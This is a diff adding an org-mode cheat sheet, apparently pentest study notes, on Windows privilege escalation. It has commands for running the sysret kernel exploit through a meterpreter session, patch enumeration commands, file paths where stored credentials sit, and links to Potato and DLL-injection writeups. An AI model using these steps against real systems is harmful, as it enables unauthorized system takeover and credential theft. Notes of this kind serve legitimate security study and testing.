@@ -1,0 +1,74 @@
+#+TAGS: sec priv
+
+
+* Privilege Escalation                                             :sec:priv:
+* Windows
+** Intel SYSTET (windows 7 and windows 2008)
+#+BEGIN_SRC sh
+sysret.exe -pid 1596
+#+END_SRC
+the pid should be for a process to hook for administrative privs (explorer.exe)
+
+- meterperter
+#+BEGIN_EXAMPLE
+meterperter > upload /root/Desktop/sysret.exe
+meterperter > getuid
+meterperter > getpid
+meterperter > execute -H -f sysret.exe -a "-pid 2348"
+#+END_EXAMPLE
+the pid is what is provided by the gitpid cmd
+
+** Windows Kernel Exploits
+- Discovery of Missing Patches
+#+BEGIN_SRC sh
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+#+END_SRC
+This will show all installed patches
+
+- Metasploit
+post/windows/gather/enum_patches
+
+- Windows Exploit Suggester
+This tool uses the information provided by the systeminfo cmd to determine the patch level of the host.
+
+- Sherlock 
+This script uses powershell to check for software patches on the local host
+
+
+** Stored Credentials
+Common Locations
+- unattended installation credential locations
+#+BEGIN_EXAMPLE
+C:\unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+#+END_EXAMPLE
+
+- metasploit
+post/windows/gather/enum_attend
+
+IIS Web Server
+#+BEGIN_EXAMPLE
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+C:\inetpub\wwwroot\web.config
+#+END_EXAMPLE
+
+** Hot Potato
+https://foxglovesecurity.com/2016/01/16/hot-potato/
+
+** Secondary Logon Handle
+https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html
+
+** DLL Injection
+http://blog.nettitude.com/uk/dll-injection-part-one
+
+** Rotten Poatato
+https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
+
+
+* Lecture
+* Tutorial
+* Books
+* Links
